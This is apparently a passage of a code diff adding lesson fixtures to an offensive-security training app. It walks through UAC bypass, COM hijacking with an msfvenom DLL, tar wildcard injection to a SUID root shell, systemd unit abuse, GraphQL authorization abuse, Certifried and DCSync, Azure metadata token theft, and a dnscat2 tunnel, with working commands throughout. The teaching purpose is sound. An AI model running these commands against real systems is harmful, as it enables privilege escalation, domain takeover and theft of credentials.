@@ -4601,4 +4601,786 @@
   };
   Object.keys(GAPFILL3).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL3[k]; });
 
+  // --- Phase-B gap-fill: eight beyond-OSCP techniques (floor, not ceiling) ---
+  var GAPFILL4 = {
+    "uac-bypass": {
+      "why": "A local administrator on Windows usually runs with a filtered (medium-integrity) token, so even as admin you cannot touch protected areas until you elevate past UAC. A UAC bypass gets you a high-integrity process without the consent prompt, which is the difference between being admin on paper and being able to dump LSASS or write to protected paths. The reliable techniques abuse an auto-elevating Microsoft binary that reads a registry key or loads a file you control (fodhelper, computerdefaults, the ms-settings handler). You need to already be in the local administrators group; this is the step that makes that membership useful.",
+      "cmd": "whoami /groups | findstr /i \"High Mandatory\"",
+      "tool": "cmd",
+      "output": "Mandatory Label\\Medium Mandatory Level   Label            S-1-16-8192",
+      "signal": "Medium Mandatory Level",
+      "teach": "You are running at Medium integrity, so UAC is filtering your admin token. A fodhelper-style bypass gives you a High-integrity shell without a prompt; then LSASS and protected paths open up.",
+      "leadup": [
+        {
+          "key": "admin",
+          "label": "You are a local admin",
+          "steps": [
+            {
+              "title": "Confirm admin membership",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "net localgroup administrators",
+              "out": "Members\n-------\nAdministrator\nbob",
+              "sig": "bob",
+              "teach": "Your account is in the administrators group, but the token is filtered; UAC is what stands between you and full admin."
+            }
+          ]
+        },
+        {
+          "key": "integrity",
+          "label": "Your token is filtered",
+          "steps": [
+            {
+              "title": "Check your integrity level",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "whoami /groups | findstr Mandatory",
+              "out": "Mandatory Label\\Medium Mandatory Level",
+              "sig": "Medium Mandatory Level",
+              "teach": "Medium integrity confirms the filtered token; a bypass elevates to High without the consent dialog."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "A UAC bypass is point an auto-elevating binary at a command you control, then run it.",
+        "items": [
+          {
+            "t": "Confirm you are a filtered admin",
+            "d": "whoami /groups shows Medium integrity while net localgroup shows you are an admin. Both must be true for a bypass to make sense.",
+            "demo": [
+              {
+                "run": "whoami /groups | findstr Mandatory",
+                "out": "Medium Mandatory Level",
+                "sig": "Medium Mandatory Level"
+              }
+            ],
+            "note": "A standard user cannot bypass UAC to admin; you must already be in the admin group."
+          },
+          {
+            "t": "Stage your payload in the hijacked key",
+            "d": "fodhelper.exe auto-elevates and reads HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command. Write your command there.",
+            "demo": [
+              {
+                "run": "reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /d \"cmd /c {{payload}}\" /f",
+                "out": "The operation completed successfully.",
+                "sig": "completed successfully"
+              }
+            ],
+            "note": "Add the DelegateExecute empty value too so the handler uses your command."
+          },
+          {
+            "t": "Trigger the auto-elevating binary",
+            "d": "Run fodhelper; it elevates and executes your staged command at High integrity, no prompt.",
+            "demo": [
+              {
+                "run": "fodhelper.exe",
+                "out": "",
+                "sig": ""
+              }
+            ],
+            "note": "computerdefaults.exe works the same way if fodhelper is watched."
+          },
+          {
+            "t": "Confirm high integrity",
+            "d": "Your new process should be High integrity; from there you can dump credentials and write protected paths.",
+            "demo": [
+              {
+                "run": "whoami /groups | findstr Mandatory",
+                "out": "Mandatory Label\\High Mandatory Level",
+                "sig": "High Mandatory Level"
+              }
+            ],
+            "note": "High integrity is full admin; clean up the registry key afterward."
+          }
+        ]
+      },
+      "situation": "You are a local administrator on Windows but whoami /groups shows Medium integrity, blocking LSASS access. What is the move?",
+      "choices": [
+        "uac-bypass",
+        "seimpersonate",
+        "lsass-dump-onbox",
+        "windows-enum"
+      ],
+      "coach": {
+        "seimpersonate": "You are already an admin, just filtered; UAC bypass is faster than a token path, and you may not hold SeImpersonate.",
+        "lsass-dump-onbox": "LSASS is blocked at Medium integrity; bypass UAC first, then dump it.",
+        "windows-enum": "Enumeration is done, you know you are a filtered admin; the step is elevating past UAC."
+      }
+    },
+    "com-hijack": {
+      "why": "A COM hijack points a CLSID a privileged process loads at a DLL you control, so when that process instantiates the object, your code runs with its privileges. It is a quieter cousin of DLL hijacking: instead of a file on disk, you write an HKCU (or writable HKLM) registry entry that redirects a CLSID to your server, and the next time a scheduled task, service, or elevated app resolves it, you win. You find candidates with a tool like acccheck or by watching Procmon for missing or user-writable CLSID lookups. It doubles as a stealthy persistence mechanism, which is why it shows up in both escalation and persistence contexts.",
+      "cmd": "reg query \"HKCU\\Software\\Classes\\CLSID\" /s | findstr InprocServer32",
+      "tool": "cmd",
+      "output": "HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0ABCD...}\\InprocServer32\n    (Default)    REG_SZ    C:\\Users\\bob\\evil.dll",
+      "signal": "InprocServer32",
+      "teach": "A CLSID resolved from HKCU points at a path you control. Replace the InprocServer32 default with your DLL; the next privileged process that instantiates that CLSID loads it as itself.",
+      "leadup": [
+        {
+          "key": "candidate",
+          "label": "A hijackable CLSID exists",
+          "steps": [
+            {
+              "title": "Find a missing/user CLSID load",
+              "tool": "procmon",
+              "where": "target",
+              "cmd": "Procmon filter: Operation is RegOpenKey, Result is NAME NOT FOUND, Path contains CLSID",
+              "out": "svchost.exe  RegOpenKey  HKCU\\...\\CLSID\\{0ABCD}\\InprocServer32  NAME NOT FOUND",
+              "sig": "NAME NOT FOUND",
+              "teach": "A privileged process looking up a CLSID in HKCU that does not exist is a hijack slot you can fill."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "COM hijack is find a CLSID a privileged process loads from a writable key, point it at your DLL, wait for the load.",
+        "items": [
+          {
+            "t": "Find a hijackable CLSID",
+            "d": "Procmon with a RegOpenKey + NAME NOT FOUND filter on CLSID paths shows objects a privileged process tries to resolve from HKCU (which you own) and cannot find.",
+            "demo": [
+              {
+                "run": "Procmon: Path contains \\CLSID\\, Result is NAME NOT FOUND",
+                "out": "svchost.exe  ...\\CLSID\\{0ABCD}\\InprocServer32  NAME NOT FOUND",
+                "sig": "NAME NOT FOUND"
+              }
+            ],
+            "note": "An HKCU miss is ideal because you can always write your own HKCU."
+          },
+          {
+            "t": "Build the COM DLL",
+            "d": "Compile a DLL that runs your payload from DllMain or the COM entry points.",
+            "demo": [
+              {
+                "run": "msfvenom -p windows/x64/exec CMD=\"net localgroup administrators {{user}} /add\" -f dll -o {{dll_name}}.dll",
+                "out": "Saved as: {{dll_name}}.dll",
+                "sig": "Saved as:"
+              }
+            ],
+            "note": "Keep it fast so it does not hang the host process."
+          },
+          {
+            "t": "Redirect the CLSID",
+            "d": "Write the InprocServer32 default value to your DLL under the key the process checks.",
+            "demo": [
+              {
+                "run": "reg add \"HKCU\\Software\\Classes\\CLSID\\{{clsid}}\\InprocServer32\" /ve /d \"C:\\Users\\{{user}}\\{{dll_name}}.dll\" /f",
+                "out": "The operation completed successfully.",
+                "sig": "completed successfully"
+              }
+            ],
+            "note": "Set the ThreadingModel to Apartment as well for broad compatibility."
+          },
+          {
+            "t": "Wait for the load and confirm",
+            "d": "The next time the privileged process instantiates the object (a scheduled task, a service start, a logon), your DLL runs as it.",
+            "demo": [
+              {
+                "run": "net localgroup administrators",
+                "out": "Members\n-------\nAdministrator\n{{user}}",
+                "sig": "Administrator"
+              }
+            ],
+            "note": "Membership confirms it; the same key is a persistence foothold."
+          }
+        ]
+      },
+      "situation": "Procmon shows a SYSTEM process resolving a CLSID from HKCU with NAME NOT FOUND. What is the move?",
+      "choices": [
+        "com-hijack",
+        "windows-dll-hijack",
+        "windows-schtask-abuse",
+        "windows-enum"
+      ],
+      "coach": {
+        "windows-dll-hijack": "That is a file-path DLL load; here the hijack is a registry CLSID redirect, which you can always write in HKCU.",
+        "windows-schtask-abuse": "No writable task target is in play; the lever is the COM object the process loads.",
+        "windows-enum": "You already found the hijackable CLSID; now redirect it."
+      }
+    },
+    "wildcard-injection": {
+      "why": "When a root cron job or script runs a command with a wildcard in a directory you can write (tar, chown, rsync, 7z on *), the shell expands the wildcard to include filenames, and several tools treat filenames that look like options as options. Drop files whose names are command-line flags (for tar, --checkpoint and --checkpoint-action=exec), and the privileged command runs your code. The tell is a cron or script that cd's into a writable directory and runs a tool on *. It is a reliable root on a surprising number of lab boxes, and it needs nothing but write access to the right folder.",
+      "cmd": "cat /etc/crontab",
+      "tool": "sh",
+      "output": "*/5 * * * * root cd /opt/backups && tar czf /tmp/backup.tgz *",
+      "signal": "tar czf /tmp/backup.tgz *",
+      "teach": "A root cron runs tar on * inside /opt/backups. If that folder is writable, drop files named like tar's checkpoint flags and tar will execute your command as root on the next run.",
+      "leadup": [
+        {
+          "key": "cron",
+          "label": "A root cron uses a wildcard",
+          "steps": [
+            {
+              "title": "Read the cron",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "cat /etc/crontab; crontab -l 2>/dev/null",
+              "out": "*/5 * * * * root cd /opt/backups && tar czf /tmp/backup.tgz *",
+              "sig": "tar czf /tmp/backup.tgz *",
+              "teach": "A privileged tar on * in a directory is the classic wildcard-injection setup."
+            }
+          ]
+        },
+        {
+          "key": "writable",
+          "label": "The directory is writable",
+          "steps": [
+            {
+              "title": "Check write access",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "ls -ld /opt/backups",
+              "out": "drwxrwxrwx 2 root root 4096 /opt/backups",
+              "sig": "drwxrwxrwx",
+              "teach": "World-writable means you can drop the flag-named files tar will expand and act on."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Wildcard injection is find the privileged wildcard command, drop flag-named files, wait for it to run.",
+        "items": [
+          {
+            "t": "Find the wildcard command",
+            "d": "Read /etc/crontab, the cron directories, and any script a privileged process runs. You want a tool invoked on * in a directory you can write.",
+            "demo": [
+              {
+                "run": "grep -r '\\*' /etc/cron* 2>/dev/null",
+                "out": "/etc/crontab:*/5 * * * * root cd /opt/backups && tar czf /tmp/backup.tgz *",
+                "sig": "tar czf /tmp/backup.tgz *"
+              }
+            ],
+            "note": "pspy catches wildcard commands run from scripts the cron files do not name."
+          },
+          {
+            "t": "Stage your payload",
+            "d": "Write a script that gives you root (a SUID bash, or a reverse shell) into the writable directory.",
+            "demo": [
+              {
+                "run": "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /opt/backups/x.sh",
+                "out": "",
+                "sig": ""
+              }
+            ],
+            "note": "A SUID copy of bash is the quietest payload; call it with bash -p."
+          },
+          {
+            "t": "Drop the flag-named files",
+            "d": "Create empty files whose names are tar's checkpoint options, so the shell passes them to tar as flags.",
+            "demo": [
+              {
+                "run": "cd /opt/backups && touch -- '--checkpoint=1' '--checkpoint-action=exec=sh x.sh'",
+                "out": "",
+                "sig": ""
+              }
+            ],
+            "note": "chown and rsync have their own abusable flags (--reference, -e)."
+          },
+          {
+            "t": "Wait for the cron and confirm",
+            "d": "On the next run, tar expands * to include your flag files and executes your script as root.",
+            "demo": [
+              {
+                "run": "/tmp/rootbash -p -c id",
+                "out": "uid=0(root) gid=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "A root SUID bash means you have root on demand."
+          }
+        ]
+      },
+      "situation": "A root cron runs tar czf backup.tgz * inside a world-writable /opt/backups. What is the move?",
+      "choices": [
+        "wildcard-injection",
+        "cron-abuse",
+        "suid-gtfobins",
+        "linux-enum"
+      ],
+      "coach": {
+        "cron-abuse": "The cron script itself is not writable; the weakness is the wildcard it expands in a writable directory.",
+        "suid-gtfobins": "No abusable SUID binary is in play; the lever is tar expanding your flag-named files.",
+        "linux-enum": "You already found the wildcard cron; now drop the flag files."
+      }
+    },
+    "systemd-timer-abuse": {
+      "why": "systemd runs services and timers as root, and when a unit file (or a script it ExecStart's) is writable by you, you own whatever it runs. A writable .service, a timer pointing at a writable script, or a service with a relative ExecStart you can PATH-hijack all give root on the next start or trigger. The tell is a non-default service or timer whose file or target you can edit; systemctl and a quick find for writable units surface them. It is the systemd-era version of cron abuse and just as reliable where the permissions slip.",
+      "cmd": "find /etc/systemd /lib/systemd -writable -type f 2>/dev/null",
+      "tool": "sh",
+      "output": "/etc/systemd/system/backup.service",
+      "signal": "/etc/systemd/system/backup.service",
+      "teach": "backup.service is a root unit file you can write. Edit its ExecStart to run your payload, reload systemd, and start it (or wait for its timer) to execute as root.",
+      "leadup": [
+        {
+          "key": "unit",
+          "label": "A writable unit exists",
+          "steps": [
+            {
+              "title": "Find writable units",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "find /etc/systemd /lib/systemd -writable -type f 2>/dev/null",
+              "out": "/etc/systemd/system/backup.service",
+              "sig": "/etc/systemd/system/backup.service",
+              "teach": "A writable unit file (or a timer target) is a direct root execution primitive."
+            }
+          ]
+        },
+        {
+          "key": "root",
+          "label": "It runs as root",
+          "steps": [
+            {
+              "title": "Confirm the unit runs as root",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "systemctl cat backup.service | grep -iE 'User|ExecStart'",
+              "out": "ExecStart=/opt/backup.sh",
+              "sig": "ExecStart=/opt/backup.sh",
+              "teach": "No User= line means it runs as root; the ExecStart target is what you control."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "systemd abuse is find a writable unit or target, point ExecStart at your payload, reload and start.",
+        "items": [
+          {
+            "t": "Find a writable unit or timer target",
+            "d": "Search the systemd directories for files you can write, and read what each ExecStart points at; a writable script the unit runs is just as good.",
+            "demo": [
+              {
+                "run": "find /etc/systemd /lib/systemd -writable -type f 2>/dev/null",
+                "out": "/etc/systemd/system/backup.service",
+                "sig": "/etc/systemd/system/backup.service"
+              }
+            ],
+            "note": "A timer (.timer) plus a writable .service target is the same win on a schedule."
+          },
+          {
+            "t": "Point ExecStart at your payload",
+            "d": "Edit the unit (or the script it runs) to execute a command that gives you root.",
+            "demo": [
+              {
+                "run": "sed -i 's#ExecStart=.*#ExecStart=/bin/bash -c \"cp /bin/bash /tmp/rb; chmod +s /tmp/rb\"#' /etc/systemd/system/backup.service",
+                "out": "",
+                "sig": ""
+              }
+            ],
+            "note": "A SUID bash copy is the cleanest payload."
+          },
+          {
+            "t": "Reload and trigger",
+            "d": "Reload the systemd config so it reads your change, then start the unit (or wait for its timer).",
+            "demo": [
+              {
+                "run": "systemctl daemon-reload 2>/dev/null; systemctl start backup.service 2>/dev/null; /tmp/rb -p -c id",
+                "out": "uid=0(root) gid=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "If you cannot reload as your user, the next scheduled trigger still runs your edit."
+          },
+          {
+            "t": "Confirm root",
+            "d": "Your SUID bash gives root on demand; capture the flag.",
+            "demo": [
+              {
+                "run": "/tmp/rb -p -c whoami",
+                "out": "root",
+                "sig": "root"
+              }
+            ],
+            "note": "Root via a writable unit file."
+          }
+        ]
+      },
+      "situation": "A root systemd service unit file under /etc/systemd/system is writable by your user. What is the move?",
+      "choices": [
+        "systemd-timer-abuse",
+        "cron-abuse",
+        "sudo-abuse",
+        "linux-enum"
+      ],
+      "coach": {
+        "cron-abuse": "This is a systemd unit, not a cron job; edit its ExecStart and trigger it.",
+        "sudo-abuse": "No sudo right is in play; the writable unit is the direct path to root.",
+        "linux-enum": "You already found the writable unit; now point its ExecStart at your payload."
+      }
+    },
+    "graphql-abuse": {
+      "why": "A GraphQL endpoint is one URL that fronts the whole data model, and it is routinely under-secured in ways a REST API would not be. Introspection often stays on, handing you the entire schema (every type, query, and mutation); from there you probe for authorization that is enforced per-resolver rather than centrally, which means a query that returns another user's data or a mutation you should not be allowed to call. Batched queries can also bypass rate limits and brute-force protections. Start with introspection, map the sensitive queries and mutations, then test each for missing authorization and injection, because one unprotected mutation is often the whole app.",
+      "cmd": "curl -s http://10.10.10.10/graphql -d '{\"query\":\"{__schema{types{name}}}\"}' -H 'Content-Type: application/json'",
+      "tool": "curl",
+      "output": "{\"data\":{\"__schema\":{\"types\":[{\"name\":\"User\"},{\"name\":\"Query\"},{\"name\":\"Mutation\"}]}}}",
+      "signal": "__schema",
+      "teach": "Introspection is enabled and returns the schema, including a Mutation type. Enumerate its fields, then test the sensitive queries and mutations for missing per-resolver authorization.",
+      "leadup": [
+        {
+          "key": "endpoint",
+          "label": "You found /graphql",
+          "steps": [
+            {
+              "title": "Confirm the endpoint",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://<target>/graphql -d '{\"query\":\"{__typename}\"}' -H 'Content-Type: application/json'",
+              "out": "{\"data\":{\"__typename\":\"Query\"}}",
+              "sig": "__typename",
+              "teach": "A __typename response confirms a live GraphQL endpoint worth attacking."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "GraphQL abuse is introspect the schema, map the sensitive operations, then test each for missing authorization.",
+        "items": [
+          {
+            "t": "Pull the schema with introspection",
+            "d": "A full introspection query returns every type, query, and mutation. GraphQL tooling (or a saved query) renders it readable.",
+            "demo": [
+              {
+                "run": "curl -s http://<target>/graphql -d '{\"query\":\"{__schema{queryType{name} mutationType{name} types{name fields{name}}}}\"}' -H 'Content-Type: application/json'",
+                "out": "\"mutationType\":{\"name\":\"Mutation\"}",
+                "sig": "\"mutationType\""
+              }
+            ],
+            "note": "If introspection is off, guess common field names or diff the client-side JS."
+          },
+          {
+            "t": "Find sensitive queries and mutations",
+            "d": "Look for users, secrets, admin, update, delete, and anything that changes state; these are where broken authorization bites.",
+            "demo": [
+              {
+                "run": "curl -s http://<target>/graphql -d '{\"query\":\"{users{id email role}}\"}' -H 'Content-Type: application/json'",
+                "out": "{\"data\":{\"users\":[{\"id\":1,\"email\":\"admin@acme.internal\",\"role\":\"admin\"}]}}",
+                "sig": "admin@acme.internal"
+              }
+            ],
+            "note": "Returning another user's data unauthenticated is a direct finding."
+          },
+          {
+            "t": "Test authorization per resolver",
+            "d": "Call privileged queries and mutations as a low-privilege (or anonymous) user. Per-resolver checks are often missing even when the login works.",
+            "demo": [
+              {
+                "run": "curl -s http://<target>/graphql -d '{\"query\":\"mutation{updateUser(id:1,role:\\\"admin\\\"){id role}}\"}' -H 'Content-Type: application/json'",
+                "out": "{\"data\":{\"updateUser\":{\"id\":1,\"role\":\"admin\"}}}",
+                "sig": "\"role\":\"admin\""
+              }
+            ],
+            "note": "A mutation you should not be allowed to run is the escalation."
+          },
+          {
+            "t": "Abuse batching and injection",
+            "d": "Batched queries can bypass rate limits for brute force, and resolver arguments can carry SQL or NoSQL injection like any other input.",
+            "note": "Treat each argument as an injectable sink and each mutation as an authorization test."
+          }
+        ]
+      },
+      "situation": "Content discovery found /graphql and introspection returns the full schema including a Mutation type. What is the move?",
+      "choices": [
+        "graphql-abuse",
+        "content-discovery",
+        "sqli-basics",
+        "idor"
+      ],
+      "coach": {
+        "content-discovery": "You already found the endpoint; now attack the schema it exposes.",
+        "sqli-basics": "Injection is one test, but GraphQL's bigger weakness is usually per-resolver authorization; map the mutations first.",
+        "idor": "IDOR is part of it; GraphQL introspection lets you find every object and operation to test at once."
+      }
+    },
+    "certifried": {
+      "why": "Certifried (CVE-2022-26923) turns any domain account that can add a machine account into Domain Admin, by abusing how AD CS maps a certificate to a computer. You create a machine account, set its dNSHostName to match a Domain Controller, request a certificate for it, and because the CA maps on that name, the certificate authenticates as the DC. From the DC's context you DCSync and own the domain. It needs AD CS present and the default MachineAccountQuota (any user can add 10 machines), both common, which is why it is a go-to when a certificate authority is in scope.",
+      "cmd": "certipy account create -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}} -user evilpc -dns dc01.{{domain}}",
+      "tool": "certipy",
+      "output": "[*] Creating machine account 'evilpc'\n[*] Successfully created account 'evilpc' with dnsHostName 'dc01.acme.internal'",
+      "signal": "dnsHostName 'dc01.acme.internal'",
+      "teach": "The new machine account's dNSHostName now matches the DC. Request a certificate for it, and AD CS issues one that authenticates as the DC; use it to DCSync.",
+      "leadup": [
+        {
+          "key": "cred",
+          "label": "You hold a domain credential",
+          "steps": [
+            {
+              "title": "Can you add a machine account",
+              "tool": "nxc",
+              "where": "local",
+              "cmd": "nxc ldap {{target}} -u {{user}} -p {{password}} -M maq",
+              "out": "MAQ  MachineAccountQuota: 10",
+              "sig": "MachineAccountQuota: 10",
+              "teach": "A non-zero quota means any user, including you, can add the machine account Certifried needs."
+            }
+          ]
+        },
+        {
+          "key": "adcs",
+          "label": "AD CS is present",
+          "steps": [
+            {
+              "title": "Find the CA",
+              "tool": "certipy",
+              "where": "local",
+              "cmd": "certipy find -u {{user}}@{{domain}} -p {{password}} -dc-ip {{target}} -stdout | grep 'CA Name'",
+              "out": "CA Name  : acme-DC01-CA",
+              "sig": "CA Name",
+              "teach": "An enterprise CA is required; its presence makes the certificate mapping abusable."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Certifried is create a machine account named like the DC, get its cert, authenticate as the DC, DCSync.",
+        "items": [
+          {
+            "t": "Confirm the preconditions",
+            "d": "You need AD CS present and a MachineAccountQuota above zero. Both are common defaults.",
+            "demo": [
+              {
+                "run": "nxc ldap {{target}} -u {{user}} -p {{password}} -M maq",
+                "out": "MachineAccountQuota: 10",
+                "sig": "MachineAccountQuota: 10"
+              }
+            ],
+            "note": "Quota 0 closes this path; find another route to privilege."
+          },
+          {
+            "t": "Create the lookalike machine account",
+            "d": "Add a machine account whose dNSHostName matches a Domain Controller.",
+            "demo": [
+              {
+                "run": "certipy account create -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}} -user evilpc -dns dc01.{{domain}}",
+                "out": "Successfully created account 'evilpc' with dnsHostName 'dc01.acme.internal'",
+                "sig": "dnsHostName 'dc01.acme.internal'"
+              }
+            ],
+            "note": "The dNSHostName is what the CA maps the certificate to."
+          },
+          {
+            "t": "Request a certificate and authenticate",
+            "d": "Request a machine certificate; the CA maps it to the DC name, so authenticating with it gives you the DC's NT hash.",
+            "demo": [
+              {
+                "run": "certipy req -u 'evilpc$'@{{domain}} -p '{{password}}' -dc-ip {{target}} -ca acme-DC01-CA -template Machine",
+                "out": "Saved certificate and private key to 'dc01.pfx'",
+                "sig": "Saved certificate and private key to 'dc01.pfx'"
+              }
+            ],
+            "note": "certipy auth -pfx dc01.pfx then returns the DC's hash."
+          },
+          {
+            "t": "DCSync and own the domain",
+            "d": "With the DC's hash you DCSync the domain for every credential, including krbtgt.",
+            "demo": [
+              {
+                "run": "secretsdump.py -hashes :{{nthash}} '{{domain}}/dc01$@{{target}}' -just-dc-user krbtgt",
+                "out": "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7a1b...:::",
+                "sig": "krbtgt:502",
+                "teach": ""
+              }
+            ],
+            "note": "krbtgt means a golden ticket and permanent domain control."
+          }
+        ]
+      },
+      "situation": "You have a low-privilege domain credential, MachineAccountQuota is 10, and an enterprise CA is present. What is the move?",
+      "choices": [
+        "certifried",
+        "adcs-esc",
+        "kerberoast",
+        "bloodhound-collect"
+      ],
+      "coach": {
+        "adcs-esc": "ESC1-8 need a vulnerable template; Certifried needs only AD CS plus the machine-account quota, which you have.",
+        "kerberoast": "Roasting is slower and needs SPNs; Certifried goes straight to the DC here.",
+        "bloodhound-collect": "You have enough to act; Certifried is a direct path to Domain Admin."
+      }
+    },
+    "azure-imds": {
+      "why": "On an Azure VM, the instance metadata service at 169.254.169.254 will hand out an access token for the VM's managed identity to anything that can reach it, so a server-side request forgery on an app running there is a token for the cloud. Unlike AWS you must ask for a specific resource (the ARM management API, Key Vault, Storage) and pass the Metadata:true header, which the SSRF has to smuggle. With a management-API token you enumerate the subscription with the az CLI or raw REST, read Key Vault secrets, and look for a role assignment or a runCommand that gives you code execution on a VM. It is the Azure twin of the AWS metadata path and increasingly common in engagements.",
+      "cmd": "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
+      "tool": "curl",
+      "output": "{\"access_token\":\"eyJ0eXAiOiJKV1Qi...\",\"resource\":\"https://management.azure.com/\",\"token_type\":\"Bearer\"}",
+      "signal": "\"access_token\"",
+      "teach": "The managed-identity token for the management API came back. Use it with the az CLI (or raw REST) to enumerate the subscription, read Key Vault secrets, and look for a runCommand to a VM.",
+      "leadup": [
+        {
+          "key": "ssrf",
+          "label": "SSRF reaches the metadata service",
+          "steps": [
+            {
+              "title": "Confirm you are on Azure",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s -H 'Metadata:true' 'http://<target>/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
+              "out": "{\"compute\":{\"name\":\"web-vm\",\"resourceGroupName\":\"rg-prod\"}}",
+              "sig": "resourceGroupName",
+              "teach": "Instance metadata confirms an Azure VM and names the resource group, so a managed-identity token is likely reachable."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Azure IMDS abuse is pull a resource-scoped token through the SSRF, then use it to enumerate and loot the subscription.",
+        "items": [
+          {
+            "t": "Request a management token",
+            "d": "Ask the metadata service for a token scoped to the ARM management API, passing Metadata:true. The SSRF must smuggle that header.",
+            "demo": [
+              {
+                "run": "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
+                "out": "{\"access_token\":\"eyJ0eXAiOiJKV1Qi...\"}",
+                "sig": "\"access_token\""
+              }
+            ],
+            "note": "A separate token is needed per resource (Key Vault uses resource=https://vault.azure.net)."
+          },
+          {
+            "t": "Enumerate with the token",
+            "d": "Load the token into the az CLI (or call REST directly) and list what the identity can see: subscriptions, resource groups, VMs, Key Vaults.",
+            "demo": [
+              {
+                "run": "az rest --url 'https://management.azure.com/subscriptions?api-version=2020-01-01' --headers \"Authorization=Bearer {{token}}\"",
+                "out": "\"displayName\": \"Production\"",
+                "sig": "displayName"
+              }
+            ],
+            "note": "The role assignment on the identity decides how far you get."
+          },
+          {
+            "t": "Loot Key Vault secrets",
+            "d": "A Key Vault token reads stored secrets, which routinely include database and admin credentials that reuse onto the hosts you are attacking.",
+            "demo": [
+              {
+                "run": "az keyvault secret show --id 'https://kv-prod.vault.azure.net/secrets/db-password'",
+                "out": "\"value\": \"Pr0dDbP@ss\"",
+                "sig": "Pr0dDbP@ss"
+              }
+            ],
+            "note": "Feed recovered secrets into the credential loop."
+          },
+          {
+            "t": "Look for code execution",
+            "d": "A Contributor or VM-admin role lets you runCommand on a VM for a shell, or create a resource that hands you one.",
+            "demo": [
+              {
+                "run": "az vm run-command invoke -g rg-prod -n web-vm --command-id RunShellScript --scripts 'id'",
+                "out": "\"message\": \"uid=0(root)\"",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "runCommand executes as root/SYSTEM on the target VM."
+          }
+        ]
+      },
+      "situation": "An SSRF on an Azure VM can reach 169.254.169.254 with a Metadata header. What turns it into access?",
+      "choices": [
+        "azure-imds",
+        "aws-credential-abuse",
+        "ssrf",
+        "content-discovery"
+      ],
+      "coach": {
+        "aws-credential-abuse": "That is the AWS metadata path; this is Azure, which needs a resource-scoped token and the Metadata header.",
+        "ssrf": "The SSRF is how you reach the metadata service; now pull a managed-identity token and use it.",
+        "content-discovery": "You are past the web app; the surface now is the Azure subscription the identity can see."
+      }
+    },
+    "dns-tunnel": {
+      "why": "When a foothold can resolve DNS but every other outbound port is filtered, DNS itself becomes your transport. A DNS tunnel encodes data in the names and responses of queries to a domain whose authoritative server you control, giving you a (slow) interactive channel or a tunnel for other tools when nothing else gets out. It is the escape hatch for egress-restricted boxes and the quiet option when you want traffic that looks like ordinary lookups. dnscat2 or iodine run a server on your box and a client on the target; once the session is up you pivot through it. Reach for it only when the faster transports (a reverse shell, an SSH tunnel) are blocked.",
+      "cmd": "nslookup -type=txt test.{{domain}} {{target}}",
+      "tool": "sh",
+      "output": "test.acme.internal   text = \"tunnel-ready\"",
+      "signal": "tunnel-ready",
+      "teach": "The box can resolve arbitrary names against a server you control, so DNS is a viable channel. Stand up a dnscat2 or iodine server on your box and run the client on the target to open the tunnel.",
+      "leadup": [
+        {
+          "key": "egress",
+          "label": "Other egress is blocked",
+          "steps": [
+            {
+              "title": "Only DNS gets out",
+              "tool": "sh",
+              "where": "target",
+              "cmd": "curl -m 5 http://{{lhost}} || echo blocked; nslookup {{lhost}} 2>/dev/null | head -1",
+              "out": "blocked\nServer:  10.10.14.5",
+              "sig": "blocked",
+              "teach": "HTTP is filtered but DNS resolves, which is exactly when a DNS tunnel is the way out."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "A DNS tunnel is confirm DNS egress, run the server on your box, run the client on the target, then pivot through it.",
+        "items": [
+          {
+            "t": "Confirm DNS is your only channel",
+            "d": "Test the fast transports first; a DNS tunnel is slow, so use it only when a reverse shell and an SSH tunnel are both blocked.",
+            "demo": [
+              {
+                "run": "curl -m 5 http://{{lhost}} || echo blocked",
+                "out": "blocked",
+                "sig": "blocked"
+              }
+            ],
+            "note": "If anything faster works, use that instead."
+          },
+          {
+            "t": "Run the tunnel server on your box",
+            "d": "dnscat2 (or iodine) listens on your attacker box as the authoritative handler for a domain you control.",
+            "demo": [
+              {
+                "run": "dnscat2-server {{domain}}",
+                "out": "Starting DNS server on 0.0.0.0:53 for domain {{domain}}",
+                "sig": "Starting DNS server",
+                "teach": ""
+              }
+            ],
+            "note": "You need a domain delegated to your server, or a direct nameserver the target can reach."
+          },
+          {
+            "t": "Run the client on the target",
+            "d": "The client encodes its traffic into queries for your domain, which your server decodes into a session.",
+            "demo": [
+              {
+                "run": "./dnscat {{domain}}",
+                "out": "Session established!",
+                "sig": "Session established!",
+                "teach": ""
+              }
+            ],
+            "note": "The session is interactive but slow; keep commands terse."
+          },
+          {
+            "t": "Pivot through the tunnel",
+            "d": "Use the session as a shell, or forward a port through it to reach services the box can see but you cannot.",
+            "demo": [
+              {
+                "run": "dnscat2> window -i 1",
+                "out": "command (target) 1>",
+                "sig": "command (target)",
+                "teach": ""
+              }
